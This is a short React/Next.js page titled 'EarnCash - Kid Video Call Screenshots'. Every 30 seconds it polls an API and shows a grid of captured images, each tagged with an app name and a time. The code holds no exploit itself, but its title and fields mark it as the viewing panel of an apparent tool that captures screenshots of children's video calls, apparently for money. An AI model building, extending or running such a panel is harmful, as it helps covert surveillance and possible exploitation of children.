'use client';

import { useEffect, useState } from 'react';

export default function Home() {
  const [screenshots, setScreenshots] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchScreenshots = async () => {
    try {
      const res = await fetch('/api/list');
      const data = await res.json();
      setScreenshots(data);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchScreenshots();
    const interval = setInterval(fetchScreenshots, 30000); // refresh every 30s
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen p-8">
      <h1 className="text-4xl font-bold mb-8 text-center">EarnCash - Kid Video Call Screenshots</h1>
      <button 
        onClick={fetchScreenshots}
        className="bg-green-600 px-6 py-3 rounded mb-8 mx-auto block"
      >
        Refresh Now
      </button>

      {loading ? (
        <p className="text-center text-xl">Loading screenshots...</p>
      ) : screenshots.length === 0 ? (
        <p className="text-center text-xl">No screenshots yet</p>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {screenshots.map((shot, i) => (
            <div key={i} className="bg-gray-900 p-4 rounded-lg">
              <img 
                src={shot.url} 
                alt={`${shot.appName} screenshot`} 
                className="w-full rounded mb-2"
              />
              <p className="text-lg">{shot.appName} • {new Date(shot.time).toLocaleString()}</p>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
